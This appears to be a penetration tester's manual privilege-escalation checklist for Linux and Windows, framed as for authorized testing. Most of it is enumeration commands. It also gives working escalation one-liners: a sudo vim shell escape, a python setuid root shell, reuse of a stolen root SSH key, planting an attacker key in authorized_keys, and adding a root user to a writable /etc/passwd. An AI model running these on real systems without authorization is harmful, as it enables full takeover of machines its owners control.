# General — things to try first

The manual privesc checklist to run by hand on a fresh shell, before or alongside the automated scripts ([PEASS](PEASS.md), [LinEnum](LinEnum.md), [Seatbelt](Seatbelt.md)). These are the quick wins that turn up on most boxes. Deeper per-vector detail is in [Linux Privilege Escalation](../Linux/Privilege%20Escalation.md) and [Windows Privilege Escalation](../Windows/Privilege%20Escalation.md).

> Authorized testing only. Stabilise the shell first ([shell → TTY upgrade](../Shell/shell.md#upgrade-to-a-full-tty)); confirm each lead by hand before it's a finding.

## Contents

- [Who am I, what can I reach](#who-am-i-what-can-i-reach)
- [sudo -l](#sudo--l)
- [SUID / SGID binaries](#suid--sgid-binaries)
- [Capabilities](#capabilities)
- [Scheduled tasks — cron & timers](#scheduled-tasks--cron--timers)
- [SSH keys](#ssh-keys)
- [Writable sensitive files](#writable-sensitive-files)
- [Windows quick wins](#windows-quick-wins)
- [Related](#related)

## Who am I, what can I reach

```bash
id; whoami; groups           # uid/gid and group membership (docker, lxd, disk, adm = escalation paths)
sudo -l                      # what can I run as root? (below)
hostname; cat /etc/os-release; uname -a    # OS + kernel (kernel version -> known exploits)
cat /etc/passwd | grep -v nologin          # real login accounts
ls -la /home/*; ls -la ~                   # home dirs you can read
```

## sudo -l

The single highest-value check. Lists what the current user may run via sudo — often a direct root shell.

```bash
sudo -l
```

- A line like `(root) NOPASSWD: /usr/bin/vim` → root shell via [GTFOBins](https://gtfobins.github.io) (`sudo vim -c ':!/bin/sh'`). See [vim as a privesc primitive](../Tools/vim.md#offensive-use--vim-as-a-privesc-primitive).
- `(ALL : ALL) ALL` with a known password → `sudo su -`.
- `env_keep`, `LD_PRELOAD`, `LD_LIBRARY_PATH` left in → library-injection escalation.
- Any allowed binary → check GTFOBins for its `sudo` breakout before anything else.

## SUID / SGID binaries

SUID binaries run as their **owner** (often root) regardless of who launches them. A SUID binary on GTFOBins is a root shell.

```bash
# SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null        # equivalent

# SGID
find / -perm -2000 -type f 2>/dev/null

# both, with details, in one sweep
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null -exec ls -la {} \;
```

Compare the results against [GTFOBins](https://gtfobins.github.io) (filter: SUID). A non-standard or custom SUID binary is worth reverse-engineering. Full detail: [Linux Privilege Escalation → SUID/SGID](../Linux/Privilege%20Escalation.md).

## Capabilities

Finer-grained than SUID — a binary may hold just enough capability to escalate (e.g. `cap_setuid`).

```bash
getcap -r / 2>/dev/null
```

`…cap_setuid+ep` on `python`/`perl`/`php` → instant root (e.g. `./python -c 'import os;os.setuid(0);os.system("/bin/sh")'`). Check each hit on GTFOBins (filter: Capabilities).

## Scheduled tasks — cron & timers

A job that runs as root on a schedule, calling something you can write to, is root.

```bash
# system cron
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
crontab -l                      # current user's crontab
cat /var/spool/cron/crontabs/* 2>/dev/null

# systemd timers (the modern cron)
systemctl list-timers --all
cat /etc/systemd/system/*.timer 2>/dev/null

# watch for jobs running live (pspy = no root needed, great for this)
./pspy64
```

Look for: a cron script in a **writable** path, a script that calls another file you can edit, a `PATH`-relative command plus a writable `PATH` dir, or a wildcard (`tar *`, `rsync`) you can poison. Detail: [Linux Privilege Escalation → Cron](../Linux/Privilege%20Escalation.md).

## SSH keys

If we have read access over the `.ssh` directory for a user, we may read their private keys at `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa` and use them to log in. If we can read `/root/.ssh/` and read `id_rsa`, copy it to our machine and use the `-i` flag to log in:

```bash
# on the target: find readable private keys
ls -la /home/*/.ssh/ /root/.ssh/ 2>/dev/null
find / -name id_rsa -o -name id_dsa -o -name '*.pem' 2>/dev/null
cat /root/.ssh/id_rsa            # if readable, copy the whole key

# on your machine: save it, fix perms (ssh refuses a world-readable key), log in
vim stolen_key                   # paste the key
chmod 600 stolen_key
ssh -i stolen_key root@TARGET
```

The other direction — **write** access to a user's `.ssh/`: drop your own public key into their `authorized_keys` and log in as them with no password.

```bash
# on your machine
ssh-keygen -f mykey              # makes mykey (private) + mykey.pub
cat mykey.pub                    # copy this line
# on the target, if ~user/.ssh is writable:
echo 'ssh-ed25519 AAAA... attacker' >> /home/user/.ssh/authorized_keys
# back on your machine
ssh -i mykey user@TARGET
```

A passphrase-protected key you found can be cracked offline — `ssh2john id_rsa > hash` then hashcat/john. See [Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md).

## Writable sensitive files

```bash
# writable /etc/passwd -> add a root user (openssl passwd -1 'pass')
ls -l /etc/passwd
# writable files owned by root, excluding the usual noise
find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys)'
# world-writable directories
find / -writable -type d 2>/dev/null
```

Writable `/etc/passwd`, `/etc/shadow`, `/etc/sudoers(.d)`, a root cron script, or a service binary are all direct root. Detail: [Linux Privilege Escalation → Writable files](../Linux/Privilege%20Escalation.md).

## Windows quick wins

The Windows equivalents — run [winPEAS](PEASS.md)/[Seatbelt](Seatbelt.md), but by hand:

```cmd
whoami /priv                     :: SeImpersonate/SeAssignPrimaryToken -> potato -> SYSTEM; SeBackup -> read SAM/NTDS
whoami /groups
systeminfo                       :: OS build/patch level -> known exploits
schtasks /query /fo LIST /v      :: scheduled tasks (look for a task running as SYSTEM calling a writable path)
```

```powershell
# unquoted service paths with a writable segment
Get-CimInstance Win32_Service | ? { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' } | select Name,PathName
# services whose binary/config you can modify  -> accesschk or:
Get-Acl 'C:\Path\to\service.exe' | fl
# AlwaysInstallElevated (both must be 0x1) -> any .msi runs as SYSTEM
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Full detail: [Windows Privilege Escalation](../Windows/Privilege%20Escalation.md). Credential hunting is its own note: [exfiltration of secrets](exfiltrationofsecrets.md).

## Related

[folder README](README.md) · [exfiltration of secrets](exfiltrationofsecrets.md) · [PEASS](PEASS.md) · [LinEnum](LinEnum.md) · [Seatbelt](Seatbelt.md) · [Linux Privilege Escalation](../Linux/Privilege%20Escalation.md) · [Windows Privilege Escalation](../Windows/Privilege%20Escalation.md) · [GTFOBins](https://gtfobins.github.io)
